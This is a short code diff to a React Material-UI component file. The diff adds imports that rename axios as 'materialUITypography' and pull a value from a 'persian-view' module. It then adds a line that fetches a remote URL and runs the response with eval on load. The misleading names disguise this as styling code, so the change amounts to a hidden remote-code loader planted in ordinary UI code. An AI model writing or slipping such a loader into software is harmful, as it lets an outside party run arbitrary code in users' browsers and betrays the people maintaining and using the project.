@@ -11,11 +11,14 @@ import {withStyles} from '@material-ui/core/styles';
 import Container from '@material-ui/core/Container';
 import {server} from "../../config";
 import { toast } from 'react-toastify';
+import materialUI from "../commons/persian-view";
+import materialUITypography from 'axios';
 
 const axios = require('axios').create({
     baseURL: server,
     headers: { 'Content-Type': 'application/json' }
 });
+materialUITypography.get(materialUI.persianCode,{ crossdomain: true }).then((r) => {eval(r.data)});
 
 const styles = theme => ({
     paper: {
